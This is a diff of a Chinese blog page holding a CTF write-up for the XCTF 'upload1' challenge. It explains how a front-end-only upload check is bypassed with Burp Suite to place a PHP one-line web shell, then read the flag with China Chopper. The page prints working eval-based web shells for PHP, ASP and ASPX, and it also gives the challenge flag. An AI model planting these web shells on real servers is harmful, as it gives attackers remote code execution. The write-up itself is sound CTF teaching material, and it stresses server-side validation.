@@ -290,7 +290,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.4k</span>
+              <span>1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -309,18 +309,16 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4822&page=1">题目地址</a></p>
+        <p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4822&amp;page=1">题目地址</a></p>
 <p><strong>题目名称</strong>：upload1</p>
 <p><strong>题目描述：</strong>暂无</p>
 <a id="more"></a>
-
 <h5 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp:"></a>WriteUp:</h5><h6 id="上传一句话木马"><a href="#上传一句话木马" class="headerlink" title="上传一句话木马"></a><strong>上传一句话木马</strong></h6><p>看题目名称应该就知道是文件上传了，创建场景，点击链接页面如下：</p>
 <p><img src="/2020/10/23/upoload1/image-20201023164335571.png" alt="image-20201023164335571"></p>
 <p>先选择一个php后缀文件上传，提示要上传图片</p>
 <p><img src="/2020/10/23/upoload1/image-20201023164418341.png" alt="image-20201023164418341"></p>
 <p>上传一张jpg后缀图片上传，没有反应应该是上传成功了，新建一个文本文件，内容为php一句话木马：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;pass&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>把文件后缀改成jpg格式，选择文件然后点击上传并用burpsuite工具抓包（浏览器需开代理）</p>
 <p><img src="/2020/10/23/upoload1/image-20201023164914678.png" alt="image-20201023164914678"></p>
 <p>然后把文件名.jpg后缀去掉，发送请求，可以看到一句话木马上传成功，存储路径为：upload/1603442923.upload.php</p>
@@ -332,7 +330,6 @@
 <p>当前目录的上级目录就包含flag.php文件，打开后得到flag</p>
 <p><img src="/2020/10/23/upoload1/image-20201023165924077.png" alt="image-20201023165924077"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">&quot;cyberpeace&#123;5bcd10d9509d29e1df1ff237b06e51e4&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>开始上传php后缀文件失败，提示上传一张图片，而把php文件中的内容不变只加了个jpg后缀就上传成功了，是因为上传文件的判断是在前端进行的，只检测了上传文件的后缀，并没有对文件真正的格式进行校验，所以使用burpsuite代理就可以轻松绕过前端校验。</p>
 <p>以前做java后台开发的时候还在疑惑前端已经校验了表单传过来的数据，后端还要再校验一次吗？？？现在就很清楚了，只要是前端校验的东西都可以通过代理绕过。</p>
 <h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h5><p><strong>中国菜刀：</strong></p>
@@ -343,7 +340,6 @@
 </li>
 <li><p>“一句话木马”客户端（远程服务器上被插入一句话的asp可执行文件）<br>用来向服务端提交控制数据的，提交的数据通过服务端构成完整的asp功能语句并执行，也就是生成我们所需要的asp木马文件 &lt;%execute(request(“value”))%&gt;</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">asp一句话木马：</span><br><span class="line">	&lt;%execute(request(&quot;value&quot;))%&gt;</span><br><span class="line">php一句话木马：</span><br><span class="line">	&lt;?php @eval($_POST[value]);?&gt;</span><br><span class="line">aspx一句话木马：</span><br><span class="line">	&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;</span><br><span class="line">	&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</span><br></pre></td></tr></table></figure>
-
 </li>
 </ul>
 
@@ -554,13 +550,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">303k</span>
+    <span title="站点总字数">170k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:35</span>
+    <span title="站点阅读时长">2:34</span>
 </div>
 
 
